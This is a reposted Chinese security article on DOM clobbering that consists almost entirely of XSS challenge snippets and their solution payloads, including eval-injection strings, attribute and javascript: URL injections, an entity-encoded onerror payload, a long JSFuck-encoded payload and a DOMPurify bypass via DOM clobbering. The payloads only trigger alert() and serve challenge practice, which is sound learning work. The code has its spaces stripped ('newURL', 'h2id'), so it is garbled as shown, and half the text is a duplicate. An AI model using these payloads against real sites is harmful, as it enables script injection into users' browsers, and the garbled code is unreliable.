# 学习一下dom破坏

> 原文: https://www.ctfiot.com/274632.html
> ID: 274632

<!-- Challenge --><h2id="spaghet"></h2><script> spaghet.innerHTML= (newURL(location).searchParams.get('somebody') ||"Somebody") +" Toucha Ma Spaghet!"</script>

<h2id="maname"></h2><script>letjeff = (newURL(location).searchParams.get('jeff') ||"JEFFF")letma =""eval(`ma = "Ma name${jeff}"`)setTimeout(_=>{ maname.innerText= ma },1000)</script>

?jeff=";alert(1)//

<!-- Challenge --><divid="uganda"></div><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=`<input type="text" placeholder="${wey}" class="form-control">`</script>

?wey="autofocus%20onfocus=alert(1337)"

<!-- Challenge --><formid="ricardo"method="GET"><inputname="milos"type="text"class="form-control"placeholder="True"value="True"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>

?ricardo=javascript:alert(1337)

<h2id="will"></h2><script> smith = (newURL(location).searchParams.get('markassbrownlee') ||"Ah That's Hawt") smith = smith.replace(/[(`)\]/g,'') will.innerHTML= smith</script>

?markassbrownlee=<img src="1"onerror="alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B">

/* Challenge */balls = (newURL(location).searchParams.get('balls') ||"Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g,'')eval(balls)

?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29

mafia = (newURL(location).searchParams.get('mafia') ||'1+1')mafia = mafia.slice(0,50)mafia = mafia.replace(/[`'"+-!\[]]/gi,'_')mafia = mafia.replace(/alert/g,'_')eval(mafia)

eval(8680439..toString(30))(1337)

eval(location.hash.slice(1))

?mafia=eval(location.hash.slice(1))#alert(1337)

Function(/ALERT(1337)/.source.toLowerCase())()

Function(/ALERT(1337)/.source.toLowerCase())()

<h2id="boomer">Ok, Boomer.</h2><script> boomer.innerHTML=DOMPurify.sanitize(newURL(location).searchParams.get('boomer') ||"Ok, Boomer")setTimeout(ok,2000)</script>

<aid=okhref=javasCript:alert(1337)>

?boomer=<aid=okhref="tel:alert(1)">

Object.getOwnPropertyNames(window).filter(p=>p.match(/Element$/)).map(p=>window[p]).filter(p=>p && p.prototype&& p.prototype.toString!==Object.prototype.toString)

看雪ID：JGwebre

https://bbs.kanxue.com/user-home-1004937.htm

*本文为看雪论坛优秀文章，由JGwebre原创，转载请注明来自看雪社区

报名中！看雪·第九届安全开发者峰会（SDC 2025）

# 往期推荐

无”痕”加载驱动模块之傀儡驱动 (上)

为 CobaltStrike 增加 SMTP Beacon

隐蔽通讯常见种类介绍

buuctf-re之CTF分析

物理读写/无附加读写实验

球分享

球点赞

球在看

点击阅读原文查看更多


```
<!-- Challenge --><h2id="spaghet"></h2><script> spaghet.innerHTML= (newURL(location).searchParams.get('somebody') ||"Somebody") +" Toucha Ma Spaghet!"</script>
```



```
<h2id="maname"></h2><script>letjeff = (newURL(location).searchParams.get('jeff') ||"JEFFF")letma =""eval(`ma = "Ma name${jeff}"`)setTimeout(_=>{ maname.innerText= ma },1000)</script>
```



```
?jeff=";alert(1)//
```



```
<!-- Challenge --><divid="uganda"></div><script>letwey = (newURL(location).searchParams.get('wey') ||"do you know da wey?"); wey = wey.replace(/[<>]/g,'') uganda.innerHTML=`<input type="text" placeholder="${wey}" class="form-control">`</script>
```



```
?wey="autofocus%20onfocus=alert(1337)"
```



```
<!-- Challenge --><formid="ricardo"method="GET"><inputname="milos"type="text"class="form-control"placeholder="True"value="True"></form><script> ricardo.action= (newURL(location).searchParams.get('ricardo') ||'#')setTimeout(_=>{ ricardo.submit() },2000)</script>
```



```
?ricardo=javascript:alert(1337)
```



```
<h2id="will"></h2><script> smith = (newURL(location).searchParams.get('markassbrownlee') ||"Ah That's Hawt") smith = smith.replace(/[(`)\]/g,'') will.innerHTML= smith</script>
```



```
?markassbrownlee=<img src="1"onerror="alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B">
```



```
/* Challenge */balls = (newURL(location).searchParams.get('balls') ||"Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g,'')eval(balls)
```



```
?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29
```



```
mafia = (newURL(location).searchParams.get('mafia') ||'1+1')mafia = mafia.slice(0,50)mafia = mafia.replace(/[`'"+-!\[]]/gi,'_')mafia = mafia.replace(/alert/g,'_')eval(mafia)
```



```
eval(8680439..toString(30))(1337)
```



```
eval(location.hash.slice(1))
```



```
?mafia=eval(location.hash.slice(1))#alert(1337)
```



```
Function(/ALERT(1337)/.source.toLowerCase())()
```



```
Function(/ALERT(1337)/.source.toLowerCase())()
```



```
<h2id="boomer">Ok, Boomer.</h2><script> boomer.innerHTML=DOMPurify.sanitize(newURL(location).searchParams.get('boomer') ||"Ok, Boomer")setTimeout(ok,2000)</script>
```



```
<aid=okhref=javasCript:alert(1337)>
```



```
?boomer=<aid=okhref="tel:alert(1)">
```



```
Object.getOwnPropertyNames(window).filter(p=>p.match(/Element$/)).map(p=>window[p]).filter(p=>p && p.prototype&& p.prototype.toString!==Object.prototype.toString)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760627322-wxsync-2025-10-71612baea187590d75a96ee2368782fc.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760627324-wxsync-2025-10-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760627325-wxsync-2025-10-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760627326-wxsync-2025-10-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1760627328-wxsync-2025-10-f3a6e530b80ade00f97deed30f426eb6.gif)